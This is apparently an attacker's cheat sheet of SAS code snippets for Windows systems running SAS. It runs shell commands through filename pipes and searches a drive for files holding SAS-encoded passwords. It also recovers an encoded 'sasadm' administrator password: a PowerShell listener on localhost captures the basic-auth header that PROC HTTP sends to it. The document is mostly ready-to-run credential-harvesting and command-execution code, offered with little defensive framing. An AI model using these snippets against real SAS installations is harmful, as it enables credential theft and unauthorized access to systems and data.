# Description
The code is given in [SAS language](https://en.wikipedia.org/wiki/SAS_language) for the SAS system.

# Find encrypted passwords on Windows
```sas
* https://documentation.sas.com/doc/en/pgmsascdc/9.4_3.5/proc/p18zxcefav5k25n11ano9p2b71er.htm#n0rhf48ontv9nzn10ncxiwpshei8
filename cmd pipe 'cd /d "E:\" && (for /r %f in (*) do @findstr /p /i /n /c:"{sas00" "%f" >nul && (echo %f && findstr /p /i /n /c:"{sas00" "%f"))';

data _null_;
	infile cmd;
	input;
	put _infile_;
run;
```

# Run system commands
```sas
/* run system commands*/
filename cmd pipe 'dir';

data _null_;
	infile cmd;
	input;
	put _infile_;
run;
```

# Decrypt an encrypted password on remote Windows
```sas
/*
Ref:
 - https://dmitriy-alergant.medium.com/a-simple-way-to-decode-any-sas-pwencoded-passwords-49221ca8765
 - http://harchut.de/proof-of-concept/sas-pwencode-decode/sas-pwencode-decode.html

$http = [System.Net.HttpListener]::new() 
$http.Prefixes.Add("http://localhost:10080/")
$http.Start()
$context = $http.GetContext()
write-host $context.Request.Headers.GetValues("Authorization")
$buffer = [System.Text.Encoding]::UTF8.GetBytes($context.Request.Headers.GetValues("Authorization"))
$context.Response.ContentLength64 = $buffer.Length
$context.Response.OutputStream.Write($buffer, 0, $buffer.Length)
$context.Response.OutputStream.Close()
*/

/* start a local http server*/
filename cmd pipe 'start powershell -Command "$http = [System.Net.HttpListener]::new(); $http.Prefixes.Add(\"http://localhost:10080/\"); $http.Start(); $context = $http.GetContext(); write-host $context.Request.Headers.GetValues(\"Authorization\"); $buffer = [System.Text.Encoding]::UTF8.GetBytes($context.Request.Headers.GetValues(\"Authorization\"));$context.Response.ContentLength64 = $buffer.Length; $context.Response.OutputStream.Write($buffer, 0, $buffer.Length); $context.Response.OutputStream.Close()"';

filename out TEMP;
proc http
    webusername="sasadm@saspw"
    webpassword="{sas..."
    auth_basic
    method="GET"
    url="http://localhost:10080"
    out=out;
run;

data _null_;
    infile out;
    input;
    put _INFILE_;
run;
```
